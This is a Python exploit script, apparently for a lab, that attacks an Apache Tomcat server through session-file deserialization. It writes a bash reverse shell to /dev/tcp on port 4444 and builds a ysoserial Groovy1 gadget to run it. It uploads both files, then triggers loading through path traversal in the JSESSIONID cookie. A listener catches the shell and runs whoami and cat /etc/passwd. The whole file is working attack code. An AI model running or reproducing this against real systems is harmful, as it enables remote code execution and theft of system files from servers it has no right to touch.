import os
import sys
import time
import socket
import argparse
import requests
import threading
import subprocess


def vprint(string):
    """
    prints the given string if the verbose flag is set
    """
    if args.verbose:
        print(string)


def read_all(conn):
    line = ""
    while True:
        line += conn.recv(1024).decode()
        if line.strip().endswith("#"):
            break
    return line


def upload_file(url, payload):
    """
    execute POST request to victim
    upload file malicious file
    """
    file_name = payload + '.session'
    file_path = '/home/'
    # upload session file
    with open(file_path + file_name, 'rb') as f:
        requests.post(
           url,
           files={"file": (file_name, f)}
        )
    # upload reverse shell script
    with open('/home/payload.sh', 'rb') as f:
        requests.post(
           url,
           files={"file": ('payload.sh', f)}
        )
    vprint("Uploaded files")


def exploit(url, payload):
    """
    trigger execution of uploaded malicious file
    persistent session is being loaded from relative path through
    path in JSESSIONID
    """
    requests.post(url,
                  headers={'Cookie':
                           f'JSESSIONID=../../../../../usr/local/tomcat/upload-dir/{payload}'})


def start_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('0.0.0.0', 4444))
        s.listen(1)
        vprint("Waiting for connection")
        conn, _ = s.accept()
        if conn:
            vprint("Recieved reverse shell.\n")
        else:
            vprint("No connection established.")
        vprint(read_all(conn))
        results = conn.send(b"whoami\n")
        vprint(read_all(conn))
        results = conn.send(b"cat /etc/passwd\n")
        vprint(read_all(conn))
        conn.send(b"exit\n")
        conn.shutdown(0)



def create_malicious_binary():
    os.system("java -jar /home/ysoserial.jar Groovy1 "
              "'bash /usr/local/tomcat/upload-dir/payload.sh'"
              " > /home/executePayload.session")
    vprint("Created binary")


def create_payload():
    """
    create reverse shell payload
    need to get own ip address for victim to connect to
    """
    os.system("touch /home/payload.sh")
    os.system('echo "#!/usr/bin/bash" >> /home/payload.sh')
    # get ip address
    ip = subprocess.check_output(["ip addr show eth0 | grep -Po 'inet \K[\d.]+'"], shell=True)
    ip = ip.decode('utf-8').rstrip()
    # create actual payload
    os.system(f'echo "bash -i >& /dev/tcp/{ip}/4444 0>&1" >> /home/payload.sh')
    vprint("Created payload")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='HTTPS-Client Simulation.')
    parser.add_argument('-ip',
                        dest='server_ip',
                        action='store',
                        type=str,
                        required=True,
                        help='The IP address of the target server')
    parser.add_argument('-v',
                        dest='verbose',
                        action='store',
                        type=bool,
                        required=False,
                        default=False,
                        help='Make the operations more talkative')
    args = parser.parse_args()

    # appending tomcat port
    ip_with_port = args.server_ip + ':8080'
    base_url = f'http://{ip_with_port}/'
    payload = 'executePayload'

    # while True:
    create_payload()
    create_malicious_binary()

    sys.stdin.readline()
    upload_file(base_url, payload)
    listener = threading.Thread(target=start_listener, args=())
    listener.start()
    time.sleep(2)
    exploit(base_url, payload)
    time.sleep(5)
